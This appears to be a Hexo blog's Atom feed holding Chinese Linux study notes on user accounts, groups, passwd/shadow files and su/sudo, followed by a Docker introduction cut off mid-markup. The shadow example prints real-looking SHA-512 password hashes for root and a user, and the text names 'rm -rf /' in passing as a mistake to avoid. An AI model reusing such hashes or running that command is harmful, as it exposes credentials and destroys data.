<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Gard3nia&#39;s Notebook</title>
  
  <subtitle>闭关修炼，静待花开~</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://gardenia30.top/"/>
  <updated>2019-11-12T07:47:16.511Z</updated>
  <id>https://gardenia30.top/</id>
  
  <author>
    <name>Gard3nia</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux基础学习笔记-账号管理与ACL权限设置</title>
    <link href="https://gardenia30.top/2019/11/12/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/"/>
    <id>https://gardenia30.top/2019/11/12/Linux学习笔记-账号管理/</id>
    <published>2019-11-12T07:17:07.000Z</published>
    <updated>2019-11-12T07:47:16.511Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以下是关于Linux用户和用户组的内容。<a id="more"></a></p><h1 id="Linux账号管理与ACL权限设置"><a href="#Linux账号管理与ACL权限设置" class="headerlink" title="Linux账号管理与ACL权限设置"></a>Linux账号管理与ACL权限设置</h1><h2 id="linux账号与用户组"><a href="#linux账号与用户组" class="headerlink" title="linux账号与用户组"></a>linux账号与用户组</h2><h3 id="用户标识符：UID和GID"><a href="#用户标识符：UID和GID" class="headerlink" title="用户标识符：UID和GID"></a>用户标识符：UID和GID</h3><p>用户ID（User ID）为UID              UID与账号的对应就在/etc/passwd中</p><p>用户组ID（Group ID）为GID       GID与组的对应在/etc/group中</p><h3 id="用户账号"><a href="#用户账号" class="headerlink" title="用户账号"></a>用户账号</h3><h4 id="拿到shell的过程"><a href="#拿到shell的过程" class="headerlink" title="拿到shell的过程"></a>拿到shell的过程</h4><p>Linux上的用户登录主机获取shell是如何进行的？首先必须要利用tty1~tty6的终端提供的登录接口，输入用户名和密码才能登录，通过网络登录则需要ssh功能，系统后台的处理过程：</p><p>1.查找/etc/passwd里面是否有账号，没有就退出，有的话就将该用户的UID和GID(etc/group)读出来，家目录和shell也读出</p><p>2.接下来就是核对密码表。在/etc/shadow里查找出同一个UID，然后核对刚刚输入的密码是否一致</p><p>3.一切顺利就进入shell</p><h4 id="etc-passwd结构"><a href="#etc-passwd结构" class="headerlink" title="/etc/passwd结构"></a>/etc/passwd结构</h4><p>每一行代表一个账户，里面有许多本来系统运行所必须的账号，简称系统账户，例如bin，adm，nobody…每一行用分号分开，每一部分代表的内容都不一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><ol><li><p>账户名称</p></li><li><p>密码</p><p>早期的unix将密码放在这个字段，由于安全性，现在放在shadow里，所以用x代替</p></li><li><p>UID</p><p>0：系统管理员</p><p>1~999：系统账号</p><p>​               1~200:linux自己建立的系统账号</p><p>​               201~999:用户创建的系统账户</p><p>1000~60000：一般用户账号</p></li><li><p>GID</p><p>与/etc/group有关，所属组的id</p></li><li><p>用户信息说明</p></li><li><p>家目录</p></li><li><p>用户默认获取的shell</p></li></ol><h4 id="etc-shadow结构"><a href="#etc-shadow结构" class="headerlink" title="/etc/shadow结构"></a>/etc/shadow结构</h4><p>程序的运行与权限有关，权限与GID和UID有关，所以程序需要读取/etc/passwd来了解不同用户的权限，所以passwd的权限必须要设置成<code>-rw-r--r--</code>，这时如果密码还是放在passwd里面，就会造成密文的泄露，所以需要将密码的密文单独移动到shadow里面，shadow的权限默认为<code>-rw-------</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$KaRerEYG$TjxFjDPsKL6m7jYzTwXsekXjt4i2a56zhxslPozbfXRKKv7CcUh2A43F.C8QfrN/riCzJIoOrjyvsLXNEuD1V/:18049:0:99999:7:::</span><br><span class="line"></span><br><span class="line">gard3nia:$6$AscHmt6SqDOyCv1p$VKdcxkNdVFDQiCgWpqhKlmSTBt8IEHz.VH5zKQn8ExZSNoqr/rsOj5q39g7d5GQgg98/n7DB53oNxntx/fJTq0::0:99999:7:::</span><br></pre></td></tr></table></figure><ol><li><p>账户</p></li><li><p>密码密文</p></li><li><p>最近修改密码的日期：距离1970/01/01的日期</p></li><li><p>密码不可被修改的天数</p><p>在最近一次修改密码以后经过多久不能修改密码</p></li><li><p>密码需要重新修改的天数</p><p>强制用户修改密码</p></li><li><p>密码需要修改期限前的警告天数</p><p>密码有效期快要到的时候，系统会发出警告给用户</p></li><li><p>密码过期以后的宽限天数</p><p>如果密码过期，在宽限天数以内可以被强制修改密码然后登陆</p></li><li><p>账号失效的日期，无论密码是否失效，都会账户失效，依旧是距离1970/01/01的天数</p></li><li><p>保留功能</p></li></ol><h3 id="关于用户组"><a href="#关于用户组" class="headerlink" title="关于用户组"></a>关于用户组</h3><h4 id="etc-group结构"><a href="#etc-group结构" class="headerlink" title="/etc/group结构"></a>/etc/group结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:  </span><br><span class="line">bin:x:1:   </span><br><span class="line">daemon:x:2:</span><br><span class="line">sys:x:3:   </span><br><span class="line">adm:x:4:</span><br></pre></td></tr></table></figure><ol><li><p>组名</p></li><li><p>用户组密码</p><p>给组的管理员使用，目前很少使用</p></li><li><p>GID</p></li><li><p>此用户组支持的账号名称</p><p>一个账号可以加入多个用户组，如果某个账号想要加入此用户组，将该用户填入这个字段即可</p></li></ol><p><strong>三个文件中相关参数的联系：</strong></p><p><img src="https://s2.ax1x.com/2019/11/11/MM0eJ0.png" alt="MM0eJ0.png"></p><h4 id="有效用户组和初始用户组"><a href="#有效用户组和初始用户组" class="headerlink" title="有效用户组和初始用户组"></a>有效用户组和初始用户组</h4><p>在学用户组和用户的时候，用户可以加入任意多个用户组，这么多用户组有什么区别呢？？？</p><p><strong>初始用户组</strong></p><p>在/etc/passwd的第四栏有一个GID，那个GID就是初始用户组的ID，用户登录系统立刻就会有这个用户组的相关权限。因为是初始用户组，所以用户一登录就会主动获取，不需要在/etc/group的第四个字段写入该账号。</p><p><strong>非初始用户组</strong></p><p>但是如果是非初始用户组的其他用户组，必须要在/etc/group这个文件中的找到该组，在其第四栏添加上该用户的用户名。</p><p><strong>有效用户组</strong></p><p>如果用户建立一个新的文件或者目录，新文件的用户组到底是哪一个？？？</p><ul><li><p>groups：有效与支持用户组的观察</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[gard3nia@localhost ~]$ groups</span><br><span class="line">gard3nia wheel docker</span><br></pre></td></tr></table></figure><p>从结果里面可以看出gard3nia属于三个用户组gard3nia wheel docker，第一个输出的用户组就为有效用户组，也就是说有效用户组为gard3nia</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[gard3nia@localhost ~]$ ls -l 1.txt</span><br><span class="line">-rw-rw-r--. 1 gard3nia gard3nia 0 Nov  9 10:45 1.txt</span><br></pre></td></tr></table></figure><p>新建文件后发现用户组确实为gard3nia</p></li><li><p>newgrp：有效用户组的切换</p><p>使用这个命令有个前提就是：<strong>你想要切换的用户组必须要是你已经有支持的用户组</strong>。也就是说上面的gard3nia用户组可以切换为wheel和docker用户组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[gard3nia@localhost ~]$ newgrp docker</span><br><span class="line">[gard3nia@localhost ~]$ groups</span><br><span class="line">docker wheel gard3nia</span><br></pre></td></tr></table></figure><p>额外讨论newgrp：</p><p>这个命令可以切换当前用户的有效用户组，而且是另外以一个shell来提供这个功能</p><p><img src="https://s2.ax1x.com/2019/11/11/MQPZrR.png" alt="MQPZrR.png"></p><p>所以上述的gard3nia相当于目前是以另一个shell登录的，而且新的shell给gard3nia有效的GID为docker，用户的用户组权限将会被重新计算，退出直接exit即可回到原来的环境。</p><h4 id="etc-gshadow"><a href="#etc-gshadow" class="headerlink" title="/etc/gshadow"></a>/etc/gshadow</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[gard3nia@localhost ~]$ sudo head -n 4 /etc/gshadow</span><br><span class="line">[sudo] password <span class="keyword">for</span> gard3nia:</span><br><span class="line">root:::</span><br><span class="line">bin:::</span><br><span class="line">daemon:::</span><br><span class="line">sys:::</span><br><span class="line">...</span><br><span class="line">gard3nia:!!::gard3nia</span><br><span class="line">nginx:!::</span><br><span class="line">cgred:!::</span><br><span class="line">dockerroot:!::</span><br><span class="line">docker:!::gard3nia</span><br><span class="line">apache:!::</span><br><span class="line">slocate:!::</span><br></pre></td></tr></table></figure><p>几乎和group文件相同，需要注意的是第二栏目，如果为空或者为！时，表示该用户组不具有用户组管理员。每个字段表示的内容：</p><ol><li>组名</li><li>密码栏：开头为！的表示无合法密码，所以没有用户组管理员</li><li>用户组管理员的账号</li><li>有加入该用户组支持的所属账号</li></ol><p>这个gshadow的最大功能就是建立用户组管理员，root平时太忙的时候，改用户组管理员就可以将需要服务的用户的账号加入到自己管理的用户组里面进行管理，由于sudo的出现，现在这个功能已经很少使用。</p></li></ul><h2 id="账号管理"><a href="#账号管理" class="headerlink" title="账号管理"></a>账号管理</h2><h3 id="新增与删除用户"><a href="#新增与删除用户" class="headerlink" title="新增与删除用户"></a>新增与删除用户</h3><h4 id="usreadd"><a href="#usreadd" class="headerlink" title="usreadd"></a>usreadd</h4><p>useradd的参数特别多，这里列出几个常用的…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-u UID</span><br><span class="line">-g 初始用户组</span><br><span class="line">-G 次要用户组</span><br><span class="line">-d 家目录绝对路径</span><br><span class="line">-s 登录获取的shell类型</span><br><span class="line">-r 创建系统账户</span><br></pre></td></tr></table></figure><p><strong>一般账号</strong></p><p>系统已经帮我们设置了好多默认的值了，所以可以简单地使用useradd+用户名来建立用户，系统会默认帮你处理下面几个选项：</p><ol><li>在/etc/passwd里面建立一条与用户相关的数据，包括建立UID,GID,家目录等等</li><li>在/etc/shadow里面将此账号的密码相关参数写入，但是还没有密码</li><li>在/etc/group里面加入一个与账户名称一样的组名</li><li>在/home下面建立家目录，权限为700</li></ol><p>这时还没有设置密码，所以还需要使用<code>passwd+用户名</code>的方法设置密码。</p><p><strong>系统账号</strong></p><p>系统账号的UID一般都是在1000号以下，加上-r参数就可以直接建立一个系统账户。系统账号主要是用来执行系统所需服务的权限设置，所以系统账号默认都不会主动建立家目录</p><h4 id="useradd的参考文件"><a href="#useradd的参考文件" class="headerlink" title="useradd的参考文件"></a>useradd的参考文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[gard3nia@localhost ~]$ useradd -D</span><br><span class="line">GROUP=100</span><br><span class="line">HOME=/home</span><br><span class="line">INACTIVE=-1</span><br><span class="line">EXPIRE=</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">SKEL=/etc/skel</span><br><span class="line">CREATE_MAIL_SPOOL=yes</span><br></pre></td></tr></table></figure><ul><li><p>GROUP=100，新建账号的初始用户组使用GID为100</p><ul><li><p>私有用户组机制</p><p>系统会建立一个与账号一样的用户组给用户作为初始用户组，这种用户组设置机制会比较有保密性，因为每个用户都会有自己的用户组，而且家目录权限还是700；</p></li><li><p>公共用户组机制</p><p>以上面的GROUP=100设置值作为新建用户的初始用户组，每个用户都属于users这个用户组，默认家目录的权限是755，大家共享家目录内的数据。</p></li></ul></li><li><p>HOME=/home，用户家目录的基准目录</p></li><li><p>INACTIVE=-1，密码过期以后是否会失效的设置值，如果是-1代表密码永远不会失效；0代表密码过期立刻失效；如果是30，则代表过期后30天后才失效。</p></li><li><p>SHELL=/bin/bash，获取的shell</p></li><li><p>EXPIRE=，shadow的第八个字段，即账号失效的日期</p></li><li><p>SKEL=/etc/skel，用户家目录参考基准目录</p></li><li><p>CREATE_MAIL_SPOOL=yes，建立用户的mailbox…</p></li></ul><h4 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h4><p>用useradd创建账号以后，在默认的状况下，该账号是锁定的，必须要用passwd来设置密码；</p><p>passwd的参数很多，可用–help自行查看，root用户修改密码不需要输入历史密码…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">passwd+用户名：帮助特定用户修改密码</span><br><span class="line">passwd：自己修改自己的密码</span><br><span class="line">passwd -S可以列出密码相关参数，看出加密是使用了sha512；</span><br><span class="line">passwd -l可以在shadow的密码位置前面加上！使得密码失效，起到lock的作用</span><br><span class="line">passwd -u解锁</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[gard3nia@localhost ~]$ sudo passwd -S gard3nia</span><br><span class="line">[sudo] password <span class="keyword">for</span> gard3nia:</span><br><span class="line">gard3nia PS 1969-12-30 0 99999 7 -1 (Password <span class="built_in">set</span>, SHA512 crypt.)</span><br></pre></td></tr></table></figure><h4 id="chage"><a href="#chage" class="headerlink" title="chage"></a>chage</h4><p>运用passwd -S查询到的信息很少，更详细的密码参数显示功能需要使用chage：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[gard3nia@localhost ~]$ chage -l gard3nia</span><br><span class="line">Last password change                                    : never</span><br><span class="line">Password expires                                        : never</span><br><span class="line">Password inactive                                       : never</span><br><span class="line">Account expires                                         : never</span><br><span class="line">Minimum number of days between password change          : 0</span><br><span class="line">Maximum number of days between password change          : 99999</span><br><span class="line">Number of days of warning before password expires       : 7</span><br></pre></td></tr></table></figure><p>更多的参数可以修改密码的一些参数，自行–help</p><h4 id="usermod"><a href="#usermod" class="headerlink" title="usermod"></a>usermod</h4><p>在useradd的时候设置错了参数，可以使用usermod来进行补救，基本上参数有很多是和useradd是一致的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-d 修改家目录</span><br><span class="line">-e 接日期，修改shadow第八栏</span><br><span class="line">-f 接天数，修改shadow第七栏</span><br><span class="line">-g 接初始用户组，修改passwd的GID</span><br><span class="line">-G 接次要用户组，修改group</span><br><span class="line">-a 与-G合用，增加次要用户组</span><br><span class="line">-l 接账户名称，即修改账户名称</span><br><span class="line">-s 修改默认shell</span><br><span class="line">-u 修改UID</span><br><span class="line">-L LOCK</span><br><span class="line">-U UNLOCK</span><br></pre></td></tr></table></figure><h4 id="userdel"><a href="#userdel" class="headerlink" title="userdel"></a>userdel</h4><p>删除用户的相关数据，数据有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户账号，密码相关数据：/etc/passwd  /etc/shadow</span><br><span class="line">用户组相关参数：/etc/group  /etc/gshadow</span><br><span class="line">用户个人文件数据：/home/name  /var/spool/mail/name</span><br></pre></td></tr></table></figure><p>参数也非常简单，加上-r连同使用者家目录一起删除：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userdel -r username</span><br></pre></td></tr></table></figure><p>这样做一般不会将用户的数据抹除干净，最好在执行userdel之前，进行<code>find / -user name</code>进行删除…</p><h3 id="用户功能"><a href="#用户功能" class="headerlink" title="用户功能"></a>用户功能</h3><p>useradd，userdel，usermod都是系统管理员才可以使用的命令，如果是一般身份，也有权限来修改除了密码以外的一些参数。</p><h4 id="id"><a href="#id" class="headerlink" title="id"></a>id</h4><p>可以查询某人或者自己的相关UID/GID信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[gard3nia@localhost ~]$ id</span><br><span class="line">uid=1000(gard3nia) gid=1000(gard3nia) groups=1000(gard3nia),10(wheel),1001(docker) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span><br></pre></td></tr></table></figure><h4 id="finger"><a href="#finger" class="headerlink" title="finger"></a>finger</h4><p>指纹…可以查看很多用户相关的信息。大部分都是/etc/passwd里面的数据，危险命令，已经不默认安装…</p><p>没安装成功，暂且搁置…</p><h4 id="chfn"><a href="#chfn" class="headerlink" title="chfn"></a>chfn</h4><p>像是change finger…没什么卵用…</p><h4 id="chsh"><a href="#chsh" class="headerlink" title="chsh"></a>chsh</h4><p>change shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chsh [-ls]</span><br><span class="line">-l 列出所有可用shell</span><br><span class="line">-s 修改自己的shell</span><br></pre></td></tr></table></figure><h3 id="新增与删除用户组"><a href="#新增与删除用户组" class="headerlink" title="新增与删除用户组"></a>新增与删除用户组</h3><p>基本上这部分的操作是与/etc/group和/etc/gshadow有关</p><h4 id="groupadd"><a href="#groupadd" class="headerlink" title="groupadd"></a>groupadd</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-g 后面接上GID表示设置某个GID</span><br><span class="line">-r 建立系统用户组</span><br></pre></td></tr></table></figure><h4 id="groupmod"><a href="#groupmod" class="headerlink" title="groupmod"></a>groupmod</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-g 修改既有的GID数字</span><br><span class="line">-n 修改既有的用户组名称</span><br></pre></td></tr></table></figure><h4 id="groupdel"><a href="#groupdel" class="headerlink" title="groupdel"></a>groupdel</h4><p>如果有某个账号的初始用户组使用该用户组，则该用户组不可删除</p><p>删除前必须要确保/etc/passwd里面的用户没有任何人使用该用户组作为初始用户组</p><h4 id="gpasswd"><a href="#gpasswd" class="headerlink" title="gpasswd"></a>gpasswd</h4><p>用户组管理员功能，如果系统管理员太忙碌，导致某些账号需要帮助时没有人，这时就可以建立用户组管理员</p><h2 id="ACL的使用"><a href="#ACL的使用" class="headerlink" title="ACL的使用"></a>ACL的使用</h2><p>暂且搁置…</p><h2 id="用户身份切换"><a href="#用户身份切换" class="headerlink" title="用户身份切换"></a>用户身份切换</h2><p>为了安全，要尽量使用一般身份的用户来进行linux的日常作业。等到需要设置系统环境的时候，再切换成root来进行管理，这样相对来说比较安全，避免出现低级失误如：<code>rm -rf /</code></p><h3 id="su"><a href="#su" class="headerlink" title="su"></a>su</h3><p>su是最简单的身份切换命令，可以进行任何身份的切换，参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-  单纯的su -代表使用login-shell的变量文件读取方式来登录系统</span><br><span class="line">-l 与-类似，后面需要加上欲切换的使用者的账户，也是login-shell方式</span><br><span class="line">-m 表示使用目前的环境设置，不读取新的使用者的配置文件</span><br><span class="line">-c 仅仅执行一次命令，加命令即可</span><br></pre></td></tr></table></figure><p><strong>su和su -的区别：</strong></p><p>单纯使用su会切换成root的身份，读取的变量设置方式为非登陆shell的方式，这种方式很多原本的变量不会被修改，例如$PATH和家目录的路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[gard3nia@localhost ~]$ su</span><br><span class="line">Password:</span><br><span class="line">[root@localhost gard3nia]<span class="comment"># pwd</span></span><br><span class="line">/home/gard3nia</span><br><span class="line">[root@localhost gard3nia]<span class="comment"># echo $PATH</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin:/usr/bin:/usr/<span class="built_in">local</span>/sbin:/usr/sbin:/home/gard3nia/.<span class="built_in">local</span>/bin:/home/gard3nia/bin</span><br></pre></td></tr></table></figure><p>但是如果使用su -就会完全切换为root的环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[gard3nia@localhost ~]$ su -                                          </span><br><span class="line">Password:                                                             </span><br><span class="line">Last login: Sat Nov  9 15:49:32 EST 2019 on pts/0                     </span><br><span class="line">[root@localhost ~]<span class="comment"># pwd                                               </span></span><br><span class="line">/root                                                                 </span><br><span class="line">[root@localhost ~]<span class="comment"># echo $PATH                                        </span></span><br><span class="line">/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin</span><br></pre></td></tr></table></figure><p>其实单单使用su命令只是切换了root的身份，但是当前的shell环境还是刚刚的一般用户的shell环境，而su -命令使用后会将用户身份和shell环境一起切换为root，所以一般还是使用su -来进行身份的切换</p><p>虽然su很方便，但是当很多人公用环境时，大家都需要使用su来切换成root，每个人都要知道root的密码，这样很不妥，所以就需要sudo；</p><h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><p>su需要的是root用户的密码，而sudo的使用只需要自己的密码。由于sudo可以让你以其他用户的身份执行命令（通常是root），因此并非所有人都能执行sudo，只有规范到/etc/sudoers内的用户才可以执行sudo。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo [-b] [-u 账号]</span><br><span class="line">-b 将后续的命令放到系统后台执行，不与目前的shell产生影响</span><br><span class="line">-u 后面加上需要切换的使用者，没有这一项代表切换root</span><br></pre></td></tr></table></figure><p>sudo可以让你切换身份去进行某项任务，执行流程如下：</p><ol><li>执行sudo后，系统于/etc/sudoers里面查找该用户是否有执行sudo的权限</li><li>若用户具有可执行sudo的权限后，便让用户输入自己的密码来确认</li><li>如果密码正确，就开始执行后续命令</li><li>想要切换的身份和执行者相同，也不需要输入密码</li></ol><p>所以关于/etc/sudoers的内容是非常重要的，一般不会采用vi的方法去修改这个文件的内容，因为该文件有一定的语法规律，不符合语法是不可以运行的，一般采用的是visudo命令。</p><p><strong>visudo</strong></p><p>其实visudo也就是用vi将sudoers的内容调出来而已 ，去添加你想要添加的用户和用户组即可</p><h2 id="用户特殊的shell和PAM模块"><a href="#用户特殊的shell和PAM模块" class="headerlink" title="用户特殊的shell和PAM模块"></a>用户特殊的shell和PAM模块</h2><p>开坑…</p><h2 id="Linux主机上的用户信息传递"><a href="#Linux主机上的用户信息传递" class="headerlink" title="Linux主机上的用户信息传递"></a>Linux主机上的用户信息传递</h2><h3 id="查询用户"><a href="#查询用户" class="headerlink" title="查询用户"></a>查询用户</h3><h4 id="w和who"><a href="#w和who" class="headerlink" title="w和who"></a>w和who</h4><p>查询当前登录在系统的用户</p><h4 id="last和lastlog"><a href="#last和lastlog" class="headerlink" title="last和lastlog"></a>last和lastlog</h4><p>last可以列出从系统建立之后到目前为止的所有登陆者信息</p><p>lastlog可以列出每个账户最近登录的时间</p><h3 id="用户对谈"><a href="#用户对谈" class="headerlink" title="用户对谈"></a>用户对谈</h3><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><p>write+对方用户名+对方终端界面 可以做到向对面的shell传输信息的功能</p><h4 id="mesg"><a href="#mesg" class="headerlink" title="mesg"></a>mesg</h4><p>mesg n 可以设置不接受任何信息</p><h4 id="wall"><a href="#wall" class="headerlink" title="wall"></a>wall</h4><p>wall+信息 广播给用户信息</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;以下是关于Linux用户和用户组的内容。
    
    </summary>
    
      <category term="Linux基础" scheme="https://gardenia30.top/categories/Linux%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Linux" scheme="https://gardenia30.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Docker学习笔记</title>
    <link href="https://gardenia30.top/2019/06/02/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/06/02/Docker学习笔记/</id>
    <published>2019-06-02T05:19:16.000Z</published>
    <updated>2019-06-02T05:38:15.784Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是在学习Docker路上的踩坑记录…<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Docker概述"><a href="#Docker概述" class="headerlink" title="Docker概述"></a>Docker概述</h2><p>Docker是基于Go语言实现的开源容器项目，诞生于2013年初，基于 Linux 内核的 cgroup，namespace，以及AUFS 类的 Union FS等技术，对进程进行封装隔离，属于 操作系统层面的虚拟化技术。由于隔离的进程独立于宿主和其它的隔离的进程，因此也称其为容器。</p><p>Docker 在容器的基础上，进行了进一步的封装，从文件系统、网络互联到进程隔离等等，极大的简化了容器的创建和维护。使得 Docker 技术比虚拟机技术更为轻便、快捷。</p><p>下面的图片比较了 Docker 和传统虚拟化方式的不同之处：</p><p><img src="https://s2.ax1x.com/2019/06/01/V3q0ns.png" alt="V3q0ns.png"></p><p><img src="https://s2.ax1x.com/2019/06/01/V3LFgg.png" alt="V3LFgg.png"></p><p>传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便；</p><h3 id="Docker镜像"><a href="#Docker镜像" class="headerlink" title="Docker镜像"></a>Docker镜像</h3><p>在 Docker 的术语里，一个只读层被称为镜像，一个镜像是永久不会变的。由于 Docker 使用一个统一文件系统，Docker 进程认为整个文件系统是以读写方式挂载的。 但是所有的变更都发生在顶层的可写层，而下层的原始的只读镜像文件并未变化。由于镜像不 可写，所以镜像是无状态的。</p><h3 id="Docker容器"><a href="#Docker容器" class="headerlink" title="Docker容器"></a>Docker容器</h3><p>镜像（<code>Image</code>）和容器（<code>Container</code>）的关系，按照我的理解，就像是面向对象程序设计中的 <code>类</code> 和 <code>实例</code> 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p><p>容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的命名空间。因此容器可以拥有自己的 <code>root</code> 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间。容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样（类似沙盒）。这种特性使得容器封装的应用比直接在宿主运行更加安全。</p><h3 id="Docker仓库"><a href="#Docker仓库" class="headerlink" title="Docker仓库"></a>Docker仓库</h3><p>镜像构建完成后，可以很容易的在当前宿主机上运行，但是，如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，Docker Registry 就是这样的服务。</p><p>一个 <strong>Docker Registry</strong> 中可以包含多个 <strong>仓库</strong>（<code>Repository</code>）；每个仓库可以包含多个 <strong>标签</strong>（<code>Tag</code>）；每个标签对应一个镜像。</p><p>通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。我们可以通过 <code>&lt;仓库名&gt;:&lt;标签&gt;</code> 的格式来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 <code>latest</code> 作为默认标签。</p><h3 id="Docker-hub"><a href="#Docker-hub" class="headerlink" title="Docker hub"></a>Docker hub</h3><p>目前 Docker 官方维护了一个公共仓库 <a href="https://hub.docker.com/" target="_blank" rel="noopener">Docker Hub</a>，其中已经包括了数量超过 15,000 的镜像。大部分需求都可以通过在 Docker Hub 中直接下载镜像来实现。</p><h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><h3 id="声明"><a href="#声明" class="headerlink" 